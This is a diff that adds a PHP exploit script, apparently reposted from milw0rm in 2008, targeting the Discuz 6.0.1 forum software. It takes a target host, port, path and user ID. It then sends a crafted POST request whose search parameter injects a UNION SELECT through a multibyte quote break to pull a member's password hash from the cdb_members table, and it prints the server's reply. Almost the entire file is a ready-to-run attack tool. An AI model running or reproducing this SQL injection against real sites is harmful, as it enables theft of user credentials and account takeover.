@@ -1,0 +1,51 @@
+<?php
+error_reporting(E_ALL&E_NOTICE);
+print_r("
++------------------------------------------------------------------+
+Exploit discuz6.0.1
+Just work as php>=5 & mysql>=4.1
+BY  james
++------------------------------------------------------------------+
+");
+
+if($argc>4)
+{
+ $host=$argv[1];
+ $port=$argv[2];
+ $path=$argv[3];
+ $uid=$argv[4];
+}else{
+ echo "Usage: php ".$argv[0]." host port path uid\n";
+ echo "host:      target server \n";
+ echo "port:      the web port, usually 80\n";
+ echo "path:      path to discuz\n";
+ echo "uid :      user ID you wanna get\n";
+ echo "Example:\r\n";
+ echo "php ".$argv[0]." localhost 80 1\n";
+ exit;
+}
+
+$content ="action=search&searchid=22%cf'UNION SELECT 1,password,3,password/**/from/**/cdb_members/**/where/**/uid=".$uid."/*&do=submit";
+
+$data = "POST /".$path."/index.php"." HTTP/1.1\r\n";
+$data .= "Accept: */*\r\n";
+$data .= "Accept-Language: zh-cn\r\n";
+$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$data .= "User-Agent: wap\r\n";
+$data .= "Host: ".$host."\r\n";
+$data .= "Content-length: ".strlen($content)."\r\n";
+$data .= "Connection: Close\r\n";
+$data .= "\r\n";
+$data .= $content."\r\n\r\n";
+$ock=fsockopen($host,$port);
+if (!$ock) {
+ echo 'No response from '.$host;
+ die;
+}
+fwrite($ock,$data);
+while (!feof($ock)) {
+   echo fgets($ock, 1024);
+}
+?>
+
+# milw0rm.com [2008-08-06]
